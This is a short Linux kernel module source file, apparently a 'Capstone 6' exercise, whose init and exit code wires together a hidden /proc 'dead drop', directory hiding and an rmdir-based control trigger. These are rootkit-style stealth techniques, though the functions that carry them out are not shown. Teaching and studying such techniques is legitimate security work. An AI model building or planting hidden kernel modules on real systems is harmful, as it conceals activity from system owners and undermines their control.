// SPDX-License-Identifier: GPL-2.0
#include "dead_drop.h"
#include <linux/init.h>
#include <linux/module.h>

static int __init dead_drop_init(void)
{
	int error = drop_create();

	if (error)
		return error;
	error = dirhide_start();
	if (error)
		goto remove_drop;
	error = trigger_start();
	if (error)
		goto stop_filter;
	return 0;
stop_filter:
	dirhide_stop();
remove_drop:
	drop_destroy();
	return error;
}

static void __exit dead_drop_exit(void)
{
	trigger_stop();
	dirhide_stop();
	drop_destroy();
}

module_init(dead_drop_init);
module_exit(dead_drop_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 6: hidden proc dead drop with rmdir control");
